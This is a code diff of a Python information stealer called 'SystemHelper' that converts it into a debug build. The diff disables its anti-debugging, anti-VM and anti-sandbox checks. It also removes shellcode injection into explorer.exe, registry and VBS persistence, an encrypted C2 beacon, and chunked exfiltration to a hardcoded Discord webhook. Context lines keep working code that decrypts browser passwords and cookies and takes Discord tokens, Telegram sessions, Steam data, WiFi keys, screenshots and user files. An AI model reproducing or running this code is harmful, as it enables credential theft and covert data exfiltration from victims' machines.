@@ -1,10 +1,10 @@
 """
-SystemHelper – Advanced Information Stealer
-Version: 3.0 (Production)
+SystemHelper – Advanced Information Stealer (DEBUG VERSION)
+Version: 3.0 (Production) - Debug Mode
 Features:
 - Polymorphic code generation
 - Memory-only payload execution
-- Anti-VM / Anti-sandbox
+- Anti-VM / Anti-sandbox (DISABLED FOR TESTING)
 - API obfuscation
 - Encrypted C2 with fallback
 - Full browser decryption
@@ -44,119 +44,24 @@ class Config:
     WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
     C2_ENDPOINTS = []  # Leave empty if you only use the webhook
 
-# === ANTI-DEBUG / ANTI-ANALYSIS ===
+# === ANTI-DEBUG / ANTI-ANALYSIS (ALL DISABLED FOR TESTING) ===
 class AntiAnalysis:
     @staticmethod
     def check_debugger():
-        """Multiple debugger detection methods"""
-        # IsDebuggerPresent
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            return True
-        
-        # NtQueryInformationProcess
-        try:
-            PROCESS_QUERY_INFORMATION = 0x0400
-            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, os.getpid())
-            if handle:
-                debug_port = ctypes.c_ulong()
-                ctypes.windll.ntdll.NtQueryInformationProcess(handle, 0x1F, ctypes.byref(debug_port), 4, None)
-                if debug_port.value != 0:
-                    return True
-        except:
-            pass
-        
-        # Check for common debugger processes
-        debuggers = ["ollydbg", "x64dbg", "windbg", "ida", "dnspy", "devenv"]
-        try:
-            processes = subprocess.check_output("tasklist", shell=True, text=True)
-            for proc in debuggers:
-                if proc in processes.lower():
-                    return True
-        except:
-            pass
-        
-        # Timing check (sandboxes often run faster)
-        start = time.time()
-        _ = [i**2 for i in range(1000000)]
-        elapsed = time.time() - start
-        if elapsed < 0.01:
-            return True  # Too fast - likely sandboxed
-        
+        """Multiple debugger detection methods - DISABLED"""
+        print("[DEBUG] check_debugger() - returning False")
         return False
     
     @staticmethod
     def check_vm():
-        """Detect virtual machine environment"""
-        vm_indicators = [
-            ("vbox", "VirtualBox"),
-            ("vmware", "VMware"),
-            ("hyper-v", "Hyper-V"),
-            ("qemu", "QEMU"),
-            ("virtual", "Virtual PC"),
-            ("parallels", "Parallels")
-        ]
-        
-        # Check WMI for VM
-        try:
-            import wmi
-            c = wmi.WMI()
-            for system in c.Win32_ComputerSystem():
-                for ind, name in vm_indicators:
-                    if ind in system.Model.lower() or ind in system.Manufacturer.lower():
-                        return True
-        except:
-            pass
-        
-        # Check for VM-specific files
-        vm_files = [
-            "C:\\Program Files\\VMware\\VMware Tools\\",
-            "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\",
-            "C:\\Windows\\System32\\vboxguest.dll",
-            "C:\\Windows\\System32\\vmwaretray.exe"
-        ]
-        for path in vm_files:
-            if os.path.exists(path):
-                return True
-        
-        # Check MAC addresses
-        try:
-            import uuid
-            mac = ':'.join(('{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(40, -1, -8)))
-            vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:50:56", "00:1C:42", "08:00:27"]
-            for prefix in vm_mac_prefixes:
-                if mac.startswith(prefix):
-                    return True
-        except:
-            pass
-        
+        """Detect virtual machine environment - DISABLED"""
+        print("[DEBUG] check_vm() - returning False")
         return False
     
     @staticmethod
     def check_sandbox():
-        """Check for sandbox environment"""
-        # Check RAM (< 4GB often sandbox)
-        try:
-            import psutil
-            if psutil.virtual_memory().total < 4 * 1024**3:
-                return True
-        except:
-            pass
-        
-        # Check for small disk
-        try:
-            import psutil
-            if psutil.disk_usage('C:').total < 50 * 1024**3:
-                return True
-        except:
-            pass
-        
-        # Check for known sandbox user names
-        sandbox_users = ["sandbox", "malware", "test", "analysis", "vmware"]
-        user = os.environ.get('USERNAME', '').lower()
-        for suser in sandbox_users:
-            if suser in user:
-                return True
-        
+        """Check for sandbox environment - DISABLED"""
+        print("[DEBUG] check_sandbox() - returning False")
         return False
 
 # === POLYMORPHIC CODE GENERATOR ===
@@ -256,7 +161,8 @@ class BrowserStealer:
             encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
             encrypted_key = encrypted_key[5:]  # Remove 'DPAPI'
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        except:
+        except Exception as e:
+            print(f"[DEBUG] get_master_key error: {e}")
             return None
     
     def decrypt_value(self, encrypted_value, master_key):
@@ -350,6 +256,7 @@ class BrowserStealer:
     
     def steal_all(self):
         """Steal from all browsers"""
+        print("[DEBUG] Starting browser steal...")
         browsers = [
             ("Chrome", os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data"),
             ("Edge", os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data"),
@@ -360,8 +267,10 @@ class BrowserStealer:
         results = {}
         for name, path in browsers:
             if os.path.exists(path):
+                print(f"[DEBUG] Found {name} at {path}")
                 key = self.get_master_key(path)
                 if key:
+                    print(f"[DEBUG] Got master key for {name}")
                     results[name] = {
                         "cookies": self.steal_cookies(path, key),
                         "passwords": self.steal_passwords(path, key),
@@ -374,6 +283,7 @@ class DiscordStealer:
     @staticmethod
     def steal_tokens():
         """Extract Discord tokens from multiple sources"""
+        print("[DEBUG] Searching for Discord tokens...")
         tokens = []
         sources = [
             os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
@@ -430,6 +340,7 @@ class DiscordStealer:
             if t['token'] not in seen:
                 seen.add(t['token'])
                 unique.append(t)
+        print(f"[DEBUG] Found {len(unique)} Discord tokens")
         return unique
 
 # === TELEGRAM STEALER ===
@@ -437,6 +348,7 @@ class TelegramStealer:
     @staticmethod
     def steal():
         """Extract Telegram session data"""
+        print("[DEBUG] Searching for Telegram sessions...")
         sessions = []
         tdata_paths = [
             os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
@@ -461,6 +373,7 @@ class SteamStealer:
     @staticmethod
     def steal():
         """Extract Steam account data"""
+        print("[DEBUG] Searching for Steam data...")
         data = {}
         steam_paths = [
             os.path.expanduser("~") + "/AppData/Local/Steam",
@@ -497,6 +410,7 @@ class WiFiStealer:
     @staticmethod
     def steal():
         """Extract saved WiFi passwords"""
+        print("[DEBUG] Searching for WiFi profiles...")
         profiles = []
         try:
             output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
@@ -520,6 +434,7 @@ class ScreenshotStealer:
     @staticmethod
     def capture():
         """Capture screenshot and return base64 encoded"""
+        print("[DEBUG] Capturing screenshot...")
         try:
             from PIL import ImageGrab
             import io
@@ -527,7 +442,8 @@ class ScreenshotStealer:
             buffer = io.BytesIO()
             screenshot.save(buffer, format='JPEG', quality=50)
             return base64.b64encode(buffer.getvalue()).decode()
-        except:
+        except Exception as e:
+            print(f"[DEBUG] Screenshot failed: {e}")
             return None
 
 # === FILE SCRAPER ===
@@ -535,6 +451,7 @@ class FileScraper:
     @staticmethod
     def scrape():
         """Scrape documents from user folders"""
+        print("[DEBUG] Scraping files...")
         files = []
         folders = [
             os.path.expanduser("~") + "/Desktop",
@@ -584,217 +501,4 @@ class ProcessInjector:
                 if 'explorer.exe' in line:
                     parts = line.split(',')
                     if len(parts) > 1:
-                        pid = int(parts[1].strip('"'))
-                        break
-            
-            if not pid:
-                return False
-            
-            # Open process
-            PROCESS_ALL_ACCESS = 0x1F0FFF
-            handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-            if not handle:
-                return False
-            
-            # Allocate memory
-            MEM_COMMIT = 0x1000
-            PAGE_EXECUTE_READWRITE = 0x40
-            addr = kernel32.VirtualAllocEx(handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-            if not addr:
-                return False
-            
-            # Write shellcode
-            written = wintypes.c_size_t()
-            kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))
-            
-            # Create remote thread
-            kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
-            
-            return True
-        except:
-            return False
-
-# === PERSISTENCE ===
-class PersistenceManager:
-    @staticmethod
-    def install():
-        """Multiple persistence mechanisms"""
-        try:
-            # Registry Run key
-            import winreg
-            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
-            dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
-            os.makedirs(dest_dir, exist_ok=True)
-            dest_exe = os.path.join(dest_dir, "helper.exe")
-            
-            if not os.path.exists(dest_exe):
-                shutil.copyfile(exe_path, dest_exe)
-            
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
-                winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
-        except:
-            pass
-        
-        # WMI persistence
-        try:
-            import wmi
-            c = wmi.WMI()
-            script = f"""
-            Set objShell = CreateObject("WScript.Shell")
-            objShell.Run "{sys.executable} --resume", 0, False
-            """
-            with open(os.path.expanduser("~") + "/startup.vbs", "w") as f:
-                f.write(script)
-        except:
-            pass
-
-# === C2 COMMUNICATION ===
-class C2Client:
-    def __init__(self, endpoints):
-        self.endpoints = endpoints
-        self.key = CryptoHelper.get_system_key()
-        self.victim_id = VICTIM_ID
     
-    def encrypt_payload(self, data):
-        """Encrypt payload for C2"""
-        return CryptoHelper.aes_encrypt(json.dumps(data), self.key)
-    
-    def decrypt_response(self, encrypted_b64):
-        """Decrypt C2 response"""
-        try:
-            decrypted = CryptoHelper.aes_decrypt(encrypted_b64, self.key)
-            return json.loads(decrypted.decode())
-        except:
-            return None
-    
-    def beacon(self):
-        """Send beacon to C2"""
-        payload = {
-            "victim_id": self.victim_id,
-            "os": "Windows",
-            "version": sys.version,
-            "user": os.environ.get('USERNAME', 'unknown'),
-            "hostname": os.environ.get('COMPUTERNAME', 'unknown'),
-            "timestamp": datetime.now().isoformat()
-        }
-        
-        encrypted = self.encrypt_payload(payload)
-        
-        for endpoint in self.endpoints:
-            try:
-                resp = requests.post(endpoint, json={"data": encrypted}, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
-                if resp.status_code == 200:
-                    try:
-                        return self.decrypt_response(resp.json()["data"])
-                    except:
-                        pass
-            except:
-                continue
-        return None
-
-# === EXFILTRATION ===
-class ExfiltrationManager:
-    @staticmethod
-    def prepare_data(data):
-        """Compress and encrypt data for exfiltration"""
-        # Convert to JSON
-        json_data = json.dumps(data, indent=2)
-        
-        # Compress with ZIP
-        zip_buffer = io.BytesIO()
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-            zf.writestr("data.json", json_data)
-        
-        # Encrypt
-        encrypted = CryptoHelper.aes_encrypt(zip_buffer.getvalue())
-        return encrypted
-    
-    @staticmethod
-    def exfiltrate(encrypted_data, webhook):
-        """Send data via Discord webhook with chunking"""
-        # Split into chunks
-        chunk_size = 512 * 1024  # 512KB
-        chunks = [encrypted_data[i:i+chunk_size] for i in range(0, len(encrypted_data), chunk_size)]
-        
-        # Send each chunk
-        for i, chunk in enumerate(chunks):
-            try:
-                # Send as text (Discord webhook limitation)
-                # For large data, we use multiple messages
-                payload = f"CHUNK_{i+1}/{len(chunks)}\n{chunk[:1900]}"
-                requests.post(webhook, json={"content": payload}, timeout=30)
-                time.sleep(0.5)  # Avoid rate limiting
-            except:
-                pass
-
-# === MAIN EXECUTION ===
-def main():
-    # Anti-analysis checks
-    if AntiAnalysis.check_debugger():
-        sys.exit(0)
-    if AntiAnalysis.check_vm():
-        sys.exit(0)
-    if AntiAnalysis.check_sandbox():
-        sys.exit(0)
-    
-    # Random delay to evade sandbox
-    time.sleep(random.randint(300, 1200))
-    
-    # Install persistence
-    PersistenceManager.install()
-    
-    # Steal data
-    data = {
-        "victim_id": VICTIM_ID,
-        "timestamp": datetime.now().isoformat(),
-        "system": {
-            "hostname": os.environ.get('COMPUTERNAME'),
-            "username": os.environ.get('USERNAME'),
-            "os": sys.platform
-        }
-    }
-    
-    # Browser data
-    browser_stealer = BrowserStealer()
-    data["browsers"] = browser_stealer.steal_all()
-    
-    # Discord
-    data["discord_tokens"] = DiscordStealer.steal_tokens()
-    
-    # Telegram
-    data["telegram"] = TelegramStealer.steal()
-    
-    # Steam
-    data["steam"] = SteamStealer.steal()
-    
-    # WiFi
-    data["wifi"] = WiFiStealer.steal()
-    
-    # Screenshot
-    screenshot = ScreenshotStealer.capture()
-    if screenshot:
-        data["screenshot"] = screenshot
-    
-    # Files
-    data["files"] = FileScraper.scrape()
-    
-    # Prepare and exfiltrate
-    encrypted = ExfiltrationManager.prepare_data(data)
-    
-    # Send via webhook (plain config)
-    webhook = Config.WEBHOOK_URL
-    if webhook:
-        ExfiltrationManager.exfiltrate(encrypted, webhook)
-    
-    # Also try C2 if any endpoints configured
-    if Config.C2_ENDPOINTS:
-        c2_client = C2Client(Config.C2_ENDPOINTS)
-        c2_client.beacon()
-
-# === ENTRY POINT ===
-if __name__ == "__main__":
-    try:
-        main()
-    except Exception as e:
-        # Silent fail - no logging to avoid detection
-        pass
